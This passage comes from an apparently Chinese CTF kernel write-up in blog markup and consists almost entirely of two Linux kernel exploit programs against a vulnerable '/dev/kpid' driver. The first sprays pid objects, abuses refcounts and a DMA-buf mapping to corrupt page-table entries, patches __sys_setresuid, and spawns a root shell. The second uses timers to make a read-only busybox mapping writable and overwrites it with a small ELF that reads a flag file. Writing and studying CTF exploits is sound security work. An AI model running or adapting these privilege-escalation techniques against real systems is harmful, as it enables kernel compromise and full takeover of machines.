j++)&#123;<br>            <span class="hljs-type">int</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid)&#123;<br>                <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                    processes[i] = pid;<br>                    fd_spray_cpu[i] = pidfd_open(pid, <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">if</span>(fd_spray_cpu[i] &lt; <span class="hljs-number">0</span>)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail %d, %d\n&quot;</span>, i, j);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                sleep(<span class="hljs-number">10</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over. Wait...&quot;</span>);<br><br>    sleep(<span class="hljs-number">15</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wait over.&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_DISCARD; i++)&#123;<br>        close(fd_spray_cpu[i]);<br>    &#125;<br><br>    kpid_put(fd_dev);<br>    close(fd_spray_cpu[N_PID_DISCARD+<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY/<span class="hljs-number">2</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> dma_buf_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> <span class="hljs-title">data</span>;</span><br>    data.len = <span class="hljs-number">0x1000</span>;<br>    data.fd_flags = O_RDWR;<br>    data.heap_flags = <span class="hljs-number">0</span>;<br>    data.fd = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=N_MMAP_SPRAY/<span class="hljs-number">2</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i;<br>        &#125;<br>    &#125;<br><br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(fork())  <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span>&#123;        <br>            <span class="hljs-keyword">if</span>(i != <span class="hljs-number">0</span>)  add_refcount(<span class="hljs-number">0x100</span>, listensock);<br>            <span class="hljs-keyword">else</span>        add_refcount(<span class="hljs-number">0xff</span>, listensock);<br>            write(fd_pipe_addref[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>            sleep(<span class="hljs-number">100000</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        read(fd_pipe_addref[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref 1 finish.&quot;</span>);<br><br>    <span class="hljs-type">void</span> *target_page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">bool</span> find = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(<br>                *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) != (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> )j<br>                || *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) != (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i<br>            )&#123;<br>                target_page = spray_pages[i]+j*<span class="hljs-number">0x1000</span>;<br>                find = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(find)    <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(find)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found target: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)target_page);<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not found target.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Remapping...&quot;</span>);<br>    munmap(target_page, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-type">void</span> *dmabuf = mmap(target_page, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_EXEC | PROT_WRITE,<br>                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="hljs-number">0</span>);<br>    <br>    *(<span class="hljs-type">char</span> *)dmabuf = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(fork())  <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span>&#123;<br>            read(fd_pipe_sync[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);        <br>            add_refcount(<span class="hljs-number">0x100</span>, listensock);<br>            write(fd_pipe_addref[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>            sleep(<span class="hljs-number">100000</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        write(fd_pipe_sync[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        read(fd_pipe_addref[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref 2 finish.&quot;</span>);<br><br>    <span class="hljs-type">void</span> *victim_page = <span class="hljs-literal">NULL</span>;<br>    find = <span class="hljs-literal">false</span>;<br>    *(<span class="hljs-type">size_t</span> *)dmabuf = <span class="hljs-number">0x800000000009c067</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(spray_pages[i]+<span class="hljs-number">0x1000</span>*j == target_page)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span>(*(<span class="hljs-type">size_t</span> *)(spray_pages[i]+<span class="hljs-number">0x1000</span>*j) &gt; <span class="hljs-number">0xffff</span>)&#123;<br>                victim_page = spray_pages[i]+<span class="hljs-number">0x1000</span>*j;<br>                kernel_offset = (*(<span class="hljs-type">size_t</span> *)(spray_pages[i]+<span class="hljs-number">0x1000</span>*j)<span class="hljs-number">-0x1c04000</span>)&amp;~<span class="hljs-number">0xfff</span>;<br>                find = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(find)    <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(find)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found victim: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)victim_page);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kernel offset: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)kernel_offset);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not found victim.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span> *)dmabuf = (PATCH_TARGET_OFFSET+kernel_offset) &amp; ~<span class="hljs-number">0xfff</span> | <span class="hljs-number">0x67</span>;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)((<span class="hljs-type">size_t</span>)victim_page + ((PATCH_TARGET_OFFSET + kernel_offset) &amp; <span class="hljs-number">0xfff</span>)) = <span class="hljs-number">0x85</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwrite __sys_setresuid...&quot;</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="利用方法2"><a href="#利用方法2" class="headerlink" title="利用方法2"></a>利用方法2</h1><p>比较简单的一种，通过add timer增加pid-&gt;count，使PTE从只读变为可写，改busybox</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PUT_MAGIC       0x69003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     SHOW_MAGIC      0x58002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     FORK_MAGIC      0x47001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_SPRAY     40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     OBJS_PER_SLAB   32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_DISCARD   15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_MMAP_SPRAY    0x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     ADD_REF         0x42</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pidfd_open</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>&#123;<br>    <span class="hljs-keyword">return</span> syscall(SYS_pidfd_open, pid, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, FORK_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_show</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> *pid)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, SHOW_MAGIC, pid);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_put</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, PUT_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> fd_spray_cpu[N_PID_SPRAY];<br><span class="hljs-type">int</span> processes[N_PID_SPRAY];<br><span class="hljs-type">char</span> *spray_pages[N_MMAP_SPRAY];<br><span class="hljs-type">int</span> fd_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> elfcode[] = &#123;<br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x78</span>,<br>    <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span>        <br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_refcount</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;ADD_REF; i++)&#123;<br>        <span class="hljs-type">timer_t</span> timerid = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">sigevent_t</span> sev = &#123;<span class="hljs-number">0</span>&#125;;<br>        sev.sigev_notify = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(timer_create(CLOCK_REALTIME, &amp;sev, &amp;timerid) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Timer.\n&quot;</span>);<br>        &#125;<br>    &#125;<br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    sleep(<span class="hljs-number">100000</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    signal(SIGCHLD, SIG_IGN);<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> sfd = open(<span class="hljs-string">&quot;/tmp/aaa&quot;</span>, O_CREAT | O_RDWR);<br>    write(sfd, elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>    lseek(sfd, <span class="hljs-number">0</span>, SEEK_SET);<br><br>    pipe(fd_pipe);<br><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        spray_pages[i] = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead0000</span>UL + i*<span class="hljs-number">0x1000</span>UL,<br>                            <span class="hljs-number">0x1000</span>, PROT_READ | PROT_EXEC,<br>                            MAP_FILE | MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(spray_pages[i] == MAP_FAILED)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail mmap %d.\n&quot;</span>, i);<br>    &#125;<br><br>    <span class="hljs-type">char</span> tmp = *(<span class="hljs-type">char</span> *)spray_pages[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">int</span> fd_dev = open(<span class="hljs-string">&quot;/dev/kpid&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == N_PID_DISCARD)&#123;<br>            kpid_clone(fd_dev);<br>            kpid_show(fd_dev, &amp;processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> == processes[N_PID_DISCARD])&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child starts.&quot;</span>);<br>                <span class="hljs-type">char</span> ch;<br>                read(fd_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br><br>                add_refcount();<br><br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exits.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kpid: %d\n&quot;</span>, processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;OBJS_PER_SLAB; j++)&#123;<br>            <span class="hljs-type">int</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid)&#123;<br>                <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                    processes[i] = pid;<br>                    fd_spray_cpu[i] = pidfd_open(pid, <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">if</span>(fd_spray_cpu[i] &lt; <span class="hljs-number">0</span>)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail %d, %d\n&quot;</span>, i, j);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                sleep(<span class="hljs-number">10</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over. Wait...&quot;</span>);<br><br>    sleep(<span class="hljs-number">15</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wait over.&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_DISCARD; i++)&#123;<br>        close(fd_spray_cpu[i]);<br>    &#125;<br><br>    kpid_put(fd_dev);<br>    close(fd_spray_cpu[N_PID_DISCARD+<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        tmp = *(<span class="hljs-type">char</span> *)(spray_pages[i]);<br>    &#125;<br><br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    read(fd_pipe[<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref finished.&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pread(sfd, spray_pages[i], <span class="hljs-keyword">sizeof</span>(elfcode), <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
